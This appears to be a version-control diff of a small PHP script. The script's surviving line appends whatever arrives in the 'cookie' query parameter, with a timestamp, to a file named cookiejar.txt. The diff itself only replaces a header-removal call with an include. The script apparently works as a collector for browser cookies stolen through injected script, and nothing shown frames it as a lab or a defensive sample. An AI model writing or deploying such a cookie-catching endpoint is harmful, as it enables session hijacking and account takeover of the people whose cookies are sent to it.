@@ -1,5 +1,5 @@
 <?php
-        header_remove("X-Powered-By");
+        require_once 'header.php';
         file_put_contents('cookiejar.txt', date('c') . " - " . $_GET['cookie'] . "\n", FILE_APPEND);
     ?>
     
